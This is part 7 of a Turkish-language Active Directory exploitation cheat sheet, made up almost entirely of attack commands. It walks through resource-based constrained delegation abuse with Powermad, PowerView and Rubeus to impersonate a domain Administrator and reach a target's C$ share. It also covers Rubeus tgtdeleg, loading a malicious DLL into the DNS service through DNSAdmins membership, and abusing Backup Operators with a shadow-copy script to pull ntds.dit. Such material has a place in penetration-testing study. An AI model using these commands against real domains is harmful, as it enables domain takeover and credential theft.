# Active Directory Exploitation Cheat Sheet - Bölüm 7

## Exploitation Örneği: 

### Powermad Kullanarak Yeni Bir Makine Hesabı Oluşturma:
```powershell
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose
```

### PowerView ile Makine Hesabının SID'ini Alma:
```powershell
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid
```

### ACE Oluşturma:
```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

### msDS-AllowedToActOnBehalfOfOtherIdentity Alanını Ayarlama:
```powershell
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

### Rubeus ile RC4 Hash Hesaplama:
```bash
Rubeus.exe hash /password:'p@ssword!'
```

### CIFS Servisinde Domain Admin İmpersonation:
```bash
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt
```

### Hedef Makinenin C$ Sürücüsüne Erişim:
```bash
dir \\TargetMachine.wtver.domain\C$
```

## Constrain ve Resource-Based Constrained Delegation

### Kekeo veya Rubeus Kullanarak Delegation Hakkını Kandırma:
- **Rubeus Kullanımı:**
  ```bash
  Rubeus.exe tgtdeleg /nowrap
  ```

## DNSAdmins Abuse

### Açıklama:
DNSAdmins grubunun bir üyesi, dns.exe'nin SYSTEM yetkileriyle keyfi bir DLL yüklemesine izin verebilir. DC bir DNS sunucusu olarak çalışıyorsa, bu yöntemle DA yetkisi yükseltilebilir.

#### DNSAdmins Grubu Üyelerini Listeleme:
- **PowerView Kullanımı:**
  ```powershell
  Get-NetGroupMember -GroupName "DNSAdmins"
  ```

- **AD Modülü Kullanımı:**
  ```powershell
  Get-ADGroupMember -Identity DNSAdmins
  ```

#### Malicious DLL ile Yetki Yükseltme:
- **dnscmd Kullanımı:**
  ```bash
dnscmd <NameOfDNSMachine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll
  ```

- **DNS Servisini Yeniden Başlatma:**
  ```bash
  sc \\DNSServer stop dns
  sc \\DNSServer start dns
  ```

## Backup Operators Grubunun Suistimali

### Açıklama:
Backup Operators grubuna üye bir kullanıcı hesabını ele geçirirsek, SeBackupPrivilege yetkisini suistimal ederek DC'nin mevcut durumunun shadow copy'sini oluşturabilir, ntds.dit dosyasını çıkarabilir ve DA yetkilerini elde edebiliriz.

#### Shadow Copy Oluşturma:
1. **Shadow Copy Script'i Oluşturma:**
```plaintext
set context persistent nowriters
set metadata c:\windows\system32\spool\drivers\color\example.cab
set verbose on
begin backup
add volume c: alias mydrive
create
expose %mydrive% w:
end backup

} 
```
